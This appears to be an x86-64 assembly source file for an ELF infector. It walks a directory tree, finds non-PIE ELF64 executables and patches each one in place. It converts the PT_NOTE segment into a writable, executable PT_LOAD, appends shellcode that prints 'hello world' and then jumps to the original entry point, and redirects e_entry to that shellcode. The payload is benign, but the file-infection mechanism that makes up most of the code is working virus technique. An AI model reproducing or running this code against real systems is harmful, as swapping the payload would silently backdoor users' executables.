%include "include.s"
%include "print.s"

; Syscall numbers for x86-64
%define SYS_WRITE       1
%define SYS_CLOSE       3
%define SYS_GETDENTS64  217

; Constants
%define AT_FDCWD        -100
%define O_RDONLY        0
%define O_DIRECTORY     0x10000
%define O_RDONLY_DIR    O_RDONLY | O_DIRECTORY
%define DT_DIR          4
%define DT_REG          8
%define STDOUT          1
%define PATH_MAX        4096
%define STACK_LOCALS    128

; Constants for file list storage
%define MAX_FILES       256
%define FILE_ENTRY_SIZE PATH_BUFF_SIZE

; Shellcode constants - must be defined before bss section
; Shellcode is 76 bytes total with register preservation:
;   14 bytes: push registers (rax, rbx, rcx, rdx, rsi, rdi, r8-r11)
;   5 bytes: mov eax, 1
;   5 bytes: mov edi, 1
;   7 bytes: lea rsi, [rel hello_string]
;   5 bytes: mov edx, 12
;   2 bytes: syscall
;   12 bytes: pop registers
;   2 bytes: movabs rax prefix
;   8 bytes: immediate address (patched at runtime)
;   2 bytes: jmp rax
;   12 bytes: "hello world\n"
%define SHELLCODE_SIZE 76
%define SHELLCODE_ENTRY_OFFSET 0x36          ; offset where to patch the original entry point

section .bss
    path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
    file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
    file_count:     resq 1                    ; number of files stored
    elf_header_buf: resb 64                   ; buffer for reading ELF header
    elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
    shellcode_buf:  resb SHELLCODE_SIZE       ; buffer for patched shellcode

section .data
    newline:        db 10               ; newline character
    msg_valid:      db " is a valid elf64 executable", 10, 0
    msg_invalid:    db " is not a valid elf64 executable", 10, 0
    msg_add_pt_load: db "add pt_load", 10, 0
    msg_skip_pie:   db "skipping PIE executable", 10, 0

; Shellcode template that prints "hello world\n" and jumps to original entry point
; This version preserves all registers to avoid corrupting dynamic linker state
; Layout (offsets in hex):
;   0x00-0x0D: push rax, rbx, rcx, rdx, rsi, rdi, r8, r9, r10, r11 (save registers)
;   0x0E-0x12: mov eax, 1 (sys_write)
;   0x13-0x17: mov edi, 1 (stdout)
;   0x18-0x1E: lea rsi, [rel hello_string]
;   0x1F-0x23: mov edx, 12
;   0x24-0x25: syscall
;   0x26-0x33: pop r11, r10, r9, r8, rdi, rsi, rdx, rcx, rbx, rax (restore registers)
;   0x34-0x35: movabs rax prefix (48 B8)
;   0x36-0x3D: 8-byte immediate (original entry point patched here at offset 0x36)
;   0x3E-0x3F: jmp rax (FF E0)
;   0x40-0x4B: "hello world\n" string
shellcode_template:
    ; Save all registers that the dynamic linker might use
    db 0x50                                  ; push rax
    db 0x53                                  ; push rbx
    db 0x51                                  ; push rcx
    db 0x52                                  ; push rdx
    db 0x56                                  ; push rsi
    db 0x57                                  ; push rdi
    db 0x41, 0x50                            ; push r8
    db 0x41, 0x51                            ; push r9
    db 0x41, 0x52                            ; push r10
    db 0x41, 0x53                            ; push r11
    ; Print "hello world\n"
    db 0xB8, 0x01, 0x00, 0x00, 0x00          ; mov eax, 1 (sys_write)
    db 0xBF, 0x01, 0x00, 0x00, 0x00          ; mov edi, 1 (stdout)
    db 0x48, 0x8D, 0x35, 0x21, 0x00, 0x00, 0x00  ; lea rsi, [rel hello_string] (offset +0x21 = 33 bytes ahead)
    db 0xBA, 0x0C, 0x00, 0x00, 0x00          ; mov edx, 12 (length)
    db 0x0F, 0x05                            ; syscall
    ; Restore all registers
    db 0x41, 0x5B                            ; pop r11
    db 0x41, 0x5A                            ; pop r10
    db 0x41, 0x59                            ; pop r9
    db 0x41, 0x58                            ; pop r8
    db 0x5F                                  ; pop rdi
    db 0x5E                                  ; pop rsi
    db 0x5A                                  ; pop rdx
    db 0x59                                  ; pop rcx
    db 0x5B                                  ; pop rbx
    db 0x58                                  ; pop rax
    ; Jump to original entry point (address patched at offset 0x36, after the 2-byte opcode)
    db 0x48, 0xB8                            ; movabs rax, <8-byte immediate follows>
    db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  ; placeholder for original entry point
    db 0xFF, 0xE0                            ; jmp rax
    ; The string
    db "hello world", 10                     ; 12 bytes

section .text
global _start
global list_files_recursive

_start:
    ; Initialize file count to 0
    mov qword [rel file_count], 0
    
    mov rsi, firstDir           ; source = /tmp/test
    lea rdi, [rel path_buffer]  ; destination = path_buffer
    call print_string
    call str_copy
    ; Call list_files_recursive with path_buffer
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    ; Call check_elf64_exec with the file list
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end

; ============================================
; list_files_recursive(char *path)
; rdi = pointer to path string
; Uses stack-allocated buffer for directory entries
; ============================================
list_files_recursive:
    push rbp
    mov rbp, rsp
    
    ; Allocate stack space:
    ; - BUFFER_SIZE bytes for dir_buffer
    ; - STACK_LOCALS bytes for local variables and saved registers
    sub rsp, BUFFER_SIZE + STACK_LOCALS
    and rsp, -16                ; Align stack to 16 bytes

    ; Stack layout:
    ; [rbp-8]   = fd (directory file descriptor)
    ; [rbp-16]  = saved path length
    ; [rbp-24]  = nread (bytes read from getdents64)
    ; [rbp-32]  = current position in buffer
    ; [rbp-40]  = saved r12 (path pointer)
    ; [rbp-48]  = saved r13 (fd)
    ; [rbp-56]  = saved r14 (nread)
    ; [rbp-64]  = saved r15 (dirent pointer)
    ; [rbp-72]  = saved rbx (d_reclen)
    ; [rbp-80]  = saved d_type during path building
    ; [rbp-88]  = saved d_reclen during path building
    ; [rbp - BUFFER_SIZE - 128 ... rbp - 128] = dir_buffer

    mov [rbp-40], r12
    mov [rbp-48], r13
    mov [rbp-56], r14
    mov [rbp-64], r15
    mov [rbp-72], rbx

    ; Save the path pointer
    mov r12, rdi                ; r12 = path

    ; Get the length of the current path
    mov rdi, r12
    call str_len
    mov [rbp-16], rax           ; save path length

    ; Open the directory
    mov eax, SYS_OPENAT         ; sys_openat
    mov edi, AT_FDCWD           ; AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDONLY_DIR       ; flags: read-only directory
    xor r10d, r10d              ; mode (not used for opening)
    syscall

    ; Check if open failed
    test rax, rax
    js .done                    ; if fd < 0, exit

    mov [rbp-8], rax            ; save fd
    mov r13, rax                ; r13 = fd

.read_loop:
    ; Call getdents64 - use stack buffer
    mov eax, SYS_GETDENTS64     ; sys_getdents64
    mov edi, r13d               ; fd
    lea rsi, [rbp - BUFFER_SIZE - STACK_LOCALS]   ; buffer on stack
    mov edx, BUFFER_SIZE        ; count
    syscall

    ; Check result
    test rax, rax
    jle .close_dir              ; if nread <= 0, we're done

    mov [rbp-24], rax           ; save nread
    mov qword [rbp-32], 0       ; pos = 0
    mov r14, rax                ; r14 = nread

.process_entry:
    mov rax, [rbp-32]           ; current position
    cmp rax, r14                ; compare with nread
    jge .read_loop              ; if pos >= nread, read more

    ; Get pointer to current dirent (in stack buffer)
    lea r15, [rbp - BUFFER_SIZE - STACK_LOCALS]
    add r15, rax                ; r15 = dirent pointer

    ; Get d_reclen (offset 16, 2 bytes)
    movzx ebx, word [r15 + 16]  ; rbx = d_reclen

    ; Get d_type (at offset 18)
    movzx eax, byte [r15 + 18]  ; eax = d_type

    ; Get d_name pointer (offset 19)
    lea rcx, [r15 + 19]         ; rcx = d_name

    ; Skip "." and ".."
    cmp byte [rcx], '.'
    jne .not_dot
    cmp byte [rcx+1], 0
    je .next_entry              ; skip "."
    cmp byte [rcx+1], '.'
    jne .not_dot
    cmp byte [rcx+2], 0
    je .next_entry              ; skip ".."

.not_dot:
    ; Save d_type and d_reclen on stack
    mov [rbp-80], rax           ; save d_type
    mov [rbp-88], rbx           ; save d_reclen

    ; Build full path: path = original_path + "/" + d_name
    mov rdi, r12                ; destination = path (our working path)
    mov rax, [rbp-16]           ; original path length
    add rdi, rax                ; point to end of original path

    ; Add "/" if needed
    cmp byte [rdi-1], '/'
    je .no_slash
    mov byte [rdi], '/'
    inc rdi

.no_slash:
    ; Append d_name (rcx still points to d_name)
    mov rsi, rcx                ; source = d_name
    call str_copy

    ; Restore d_type
    mov rax, [rbp-80]           ; restore d_type

    ; Check if it's a regular file (DT_REG = 8)
    cmp al, DT_REG
    jne .check_dir

    ; Check if we have room for more files (bounds checking)
    mov rax, [rel file_count]
    cmp rax, MAX_FILES
    jge .skip_store             ; skip if file_list is full

    ; Store the file path in file_list
    ; Calculate destination: file_list + (file_count * FILE_ENTRY_SIZE)
    imul rax, FILE_ENTRY_SIZE
    lea rdi, [rel file_list]
    add rdi, rax                ; destination = file_list[file_count]
    mov rsi, r12                ; source = current path
    call str_copy
    
    ; Increment file count
    mov rax, [rel file_count]
    inc rax
    mov [rel file_count], rax

.skip_store:
    ; Print the full path
    mov rdi, r12                ; path
    call print_string
    
    ; Print newline
    push rax
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    pop rax
    jmp .restore_path

.check_dir:
    ; Check if it's a directory (DT_DIR = 4)
    cmp al, DT_DIR
    jne .restore_path

    ; Recurse into directory
    mov rdi, r12
    call list_files_recursive

.restore_path:
    ; Restore the original path by truncating at saved length
    mov rax, [rbp-16]           ; original path length
    mov byte [r12 + rax], 0     ; null terminate

    ; Restore d_reclen to rbx for next_entry calculation
    mov rbx, [rbp-88]

.next_entry:
    ; Move to next entry
    mov rax, [rbp-32]           ; current pos
    add rax, rbx                ; add d_reclen
    mov [rbp-32], rax           ; update pos
    jmp .process_entry

.close_dir:
    ; Close the directory
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.done:
    ; Restore saved registers
    mov r12, [rbp-40]
    mov r13, [rbp-48]
    mov r14, [rbp-56]
    mov r15, [rbp-64]
    mov rbx, [rbp-72]

    mov rsp, rbp
    pop rbp
    ret

; ============================================
; str_len(char *str) -> rax = length
; rdi = pointer to null-terminated string
; ============================================
str_len:
    push rdi
    xor rax, rax
.loop:
    cmp byte [rdi], 0
    je .done
    inc rdi
    inc rax
    jmp .loop
.done:
    pop rdi
    ret

; ============================================
; str_copy(char *dest, char *src)
; rdi = destination
; rsi = source
; Copies src to dest including null terminator
; Returns original destination pointer
; ============================================
str_copy:
    push rdi
.loop:
    lodsb                       ; load byte from [rsi] into al, inc rsi
    stosb                       ; store al to [rdi], inc rdi
    test al, al
    jnz .loop
    pop rax                     ; return original dest in rax
    ret

; ============================================
; check_elf64_exec(char *file_list, uint64_t count)
; rdi = pointer to file list (each entry is FILE_ENTRY_SIZE bytes)
; rsi = number of files in the list
; Checks each file and prints if it's a valid ELF64 executable
; ============================================
check_elf64_exec:
    push rbp
    mov rbp, rsp
    push r12                    ; saved file list pointer
    push r13                    ; saved file count
    push r14                    ; current file index
    push r15                    ; current file path pointer
    push rbx                    ; saved for later use

    mov r12, rdi                ; r12 = file_list base
    mov r13, rsi                ; r13 = total file count
    xor r14, r14                ; r14 = current index = 0

.check_loop:
    cmp r14, r13                ; if index >= count, done
    jge .check_done

    ; Calculate current file path: r15 = file_list + (index * FILE_ENTRY_SIZE)
    mov rax, r14
    imul rax, FILE_ENTRY_SIZE
    lea r15, [r12 + rax]        ; r15 = current file path

    ; Open the file for reading
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r15                ; pathname
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .invalid_file            ; if fd < 0, mark as invalid

    mov rbx, rax                ; save fd in rbx

    ; Read the first 64 bytes (ELF header)
    mov eax, SYS_READ
    mov edi, ebx                ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes (Ehdr size)
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .close_and_invalid

    ; Check ELF magic: 0x7f 'E' 'L' 'F'
    lea rdi, [rel elf_header_buf]
    cmp byte [rdi + 0], 0x7f
    jne .close_and_invalid
    cmp byte [rdi + 1], 'E'
    jne .close_and_invalid
    cmp byte [rdi + 2], 'L'
    jne .close_and_invalid
    cmp byte [rdi + 3], 'F'
    jne .close_and_invalid

    ; Check ELF class (offset 4): must be 2 for 64-bit
    cmp byte [rdi + 4], 2       ; ELFCLASS64 = 2
    jne .close_and_invalid

    ; Check e_type (offset 16): must be 2 for executable (ET_EXEC)
    ; or 3 for shared object (ET_DYN) which can also be an executable
    movzx eax, word [rdi + 16]  ; e_type is at offset 16 in ELF header
    cmp ax, 2                   ; ET_EXEC = 2
    je .valid_elf
    cmp ax, 3                   ; ET_DYN = 3 (PIE executables)
    je .valid_elf
    jmp .close_and_invalid

.valid_elf:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

    ; Print filename
    mov rdi, r15
    call print_string

    ; Print " is a valid elf64 executable\n"
    lea rdi, [rel msg_valid]
    call print_string

    ; Call add_pt_load for this valid ELF64 executable
    mov rdi, r15                ; pass the file path
    call add_pt_load

    jmp .next_file

.close_and_invalid:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.invalid_file:
    ; Print filename
    mov rdi, r15
    call print_string

    ; Print " is not a valid elf64 executable\n"
    lea rdi, [rel msg_invalid]
    call print_string

.next_file:
    inc r14                     ; index++
    jmp .check_loop

.check_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; add_pt_load(char *filepath)
; rdi = pointer to file path
; Converts a PT_NOTE segment to PT_LOAD in the ELF file,
; pointing to the end of the file with filesz/memsz = 0x1000
; Also modifies e_entry to point to injected shellcode that
; prints "hello world" and jumps to the original entry point
; ============================================
add_pt_load:
    push rbp
    mov rbp, rsp
    sub rsp, 48                 ; allocate local variable space
    push r12                    ; saved file path
    push r13                    ; saved file descriptor
    push r14                    ; saved e_phoff
    push r15                    ; saved e_phnum
    push rbx                    ; saved e_phentsize

    ; Stack layout:
    ; [rbp-8]  = file size
    ; [rbp-16] = PT_NOTE index
    ; [rbp-24] = original e_entry
    ; [rbp-32] = new p_vaddr (new entry point)

    mov r12, rdi                ; r12 = file path

    ; Open the file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12                ; pathname
    mov edx, O_RDWR             ; flags: read-write
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .add_pt_load_fail        ; if fd < 0, fail

    mov r13, rax                ; r13 = fd

    ; Get the file size using lseek to SEEK_END
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    mov edx, SEEK_END           ; whence = SEEK_END
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    mov [rbp-8], rax            ; save file size at [rbp-8]

    ; Seek back to beginning for reading ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    xor edx, edx                ; SEEK_SET = 0
    syscall

    ; Read the ELF header (64 bytes)
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .add_pt_load_close_fail

    ; Get e_phoff (program header table offset) from ELF header at offset 32
    lea rdi, [rel elf_header_buf]

    ; Check e_type: skip PIE executables (ET_DYN = 3) as they use relative addressing
    ; Our shellcode uses absolute jumps which only work with ET_EXEC (type 2)
    movzx eax, word [rdi + 16]      ; e_type at offset 16
    cmp ax, 2                       ; ET_EXEC = 2
    jne .skip_pie_executable        ; skip if not ET_EXEC (includes PIE/ET_DYN)

    mov r14, [rdi + e_phoff]    ; r14 = e_phoff

    ; Save original e_entry (offset 24 in ELF header)
    mov rax, [rdi + e_entry]
    mov [rbp-24], rax           ; save original entry point

    ; Get e_phnum (number of program headers) from ELF header at offset 56
    movzx r15d, word [rdi + e_phnum]  ; r15 = e_phnum

    ; Get e_phentsize (size of each program header entry) from ELF header at offset 54
    movzx ebx, word [rdi + e_phentsize]  ; rbx = e_phentsize

    ; Seek to the program header table
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Read all existing program headers
    ; Calculate total size first: e_phnum * e_phentsize
    mov rax, r15                ; e_phnum
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; read size
    
    mov eax, SYS_READ
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Find a PT_NOTE segment to convert to PT_LOAD
    lea rdi, [rel elf_phdr_buf]
    xor rcx, rcx                ; index counter
    mov [rbp-16], rcx           ; save index of found PT_NOTE (-1 if not found)
    dec qword [rbp-16]          ; set to -1 initially

.find_note_loop:
    cmp rcx, r15                ; compare with e_phnum
    jge .find_note_done

    ; Calculate offset to current phdr
    mov rax, rcx
    imul rax, rbx               ; * e_phentsize
    lea rsi, [rdi + rax]        ; rsi = pointer to current phdr

    ; Check if p_type == PT_NOTE (4)
    cmp dword [rsi + p_type], PT_NOTE
    jne .find_note_next

    ; Found PT_NOTE, save index
    mov [rbp-16], rcx
    jmp .find_note_done

.find_note_next:
    inc rcx
    jmp .find_note_loop

.find_note_done:
    ; Check if we found a PT_NOTE
    cmp qword [rbp-16], -1
    je .add_pt_load_close_fail  ; No PT_NOTE found, fail

    ; Get pointer to the PT_NOTE we're converting
    mov rcx, [rbp-16]           ; index of PT_NOTE
    mov rax, rcx
    imul rax, rbx               ; * e_phentsize
    lea rdi, [rel elf_phdr_buf]
    add rdi, rax                ; rdi = pointer to PT_NOTE phdr

    ; Convert PT_NOTE to PT_LOAD
    ; p_type = PT_LOAD (1)
    mov dword [rdi + p_type], PT_LOAD

    ; p_flags = PF_R | PF_W | PF_X (readable, writable, executable)
    mov dword [rdi + p_flags], PF_R | PF_W | PF_X

    ; p_offset = file size (end of current file)
    mov rax, [rbp-8]            ; get file size
    mov qword [rdi + p_offset], rax

    ; p_vaddr = Compute virtual address that is congruent with p_offset modulo page size
    ; The formula is: p_vaddr = base_address + (p_offset & 0xfff)
    ; where base_address is page-aligned and chosen to not conflict with existing segments
    ; This ensures (p_vaddr % p_align) == (p_offset % p_align) for correct loading
    mov rcx, rax                ; file size = p_offset
    and rcx, 0xfff              ; get the page offset part (p_offset & 0xfff)
    add rcx, 0xc000000          ; add base address offset (page-aligned)
    mov qword [rdi + p_vaddr], rcx
    mov [rbp-32], rcx           ; save new p_vaddr (this becomes the new entry point)

    ; p_paddr = same as p_vaddr
    mov qword [rdi + p_paddr], rcx

    ; p_filesz = PT_LOAD_FILESZ (from include.s)
    mov qword [rdi + p_filesz], PT_LOAD_FILESZ

    ; p_memsz = PT_LOAD_MEMSZ (from include.s)
    mov qword [rdi + p_memsz], PT_LOAD_MEMSZ

    ; p_align = 0x1000 (4KB alignment)
    mov qword [rdi + p_align], 0x1000

    ; Update e_entry in elf_header_buf to point to new PT_LOAD segment's p_vaddr
    lea rdi, [rel elf_header_buf]
    mov rax, [rbp-32]           ; new entry point (p_vaddr)
    mov [rdi + e_entry], rax

    ; Copy shellcode template to shellcode_buf and patch the original entry point
    lea rsi, [rel shellcode_template]
    lea rdi, [rel shellcode_buf]
    mov rcx, SHELLCODE_SIZE
.copy_shellcode:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jnz .copy_shellcode

    ; Patch the original entry point into shellcode at offset SHELLCODE_ENTRY_OFFSET
    lea rdi, [rel shellcode_buf]
    mov rax, [rbp-24]           ; original e_entry
    mov [rdi + SHELLCODE_ENTRY_OFFSET], rax

    ; Seek to end of file (p_offset of new PT_LOAD segment = file size)
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, [rbp-8]            ; offset = file size
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Write the patched shellcode to the end of the file
    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel shellcode_buf]
    mov edx, SHELLCODE_SIZE
    syscall

    cmp rax, SHELLCODE_SIZE
    jl .add_pt_load_close_fail

    ; Seek to beginning of file to write updated ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    xor esi, esi                ; offset = 0
    xor edx, edx                ; SEEK_SET = 0
    syscall

    ; Write updated ELF header (with new e_entry)
    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; write 64 bytes (ELF header size)
    syscall

    ; Seek to the program header table to write back the modified program headers
    mov eax, SYS_LSEEK
    mov edi, r13d               ; fd
    mov rsi, r14                ; offset = e_phoff
    xor edx, edx                ; SEEK_SET = 0
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    ; Write all program headers (with the modified one)
    ; Calculate total size first: e_phnum * e_phentsize
    mov rax, r15                ; e_phnum (original, not incremented)
    imul rax, rbx               ; * e_phentsize
    mov rdx, rax                ; write size

    mov eax, SYS_WRITE
    mov edi, r13d               ; fd
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print success message
    lea rdi, [rel msg_add_pt_load]
    call print_string

    jmp .add_pt_load_done

.add_pt_load_close_fail:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall
    jmp .add_pt_load_fail

.skip_pie_executable:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Print message indicating PIE executable was skipped
    lea rdi, [rel msg_skip_pie]
    call print_string
    jmp .add_pt_load_done

.add_pt_load_fail:
    ; No success message printed on failure

.add_pt_load_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    add rsp, 48                 ; deallocate local variable space
    mov rsp, rbp
    pop rbp
    ret

_end:
  mov rdi, the_end
  call print_string
  mov eax, 60                 ; sys_exit
  xor edi, edi                ; status = 0
  syscall
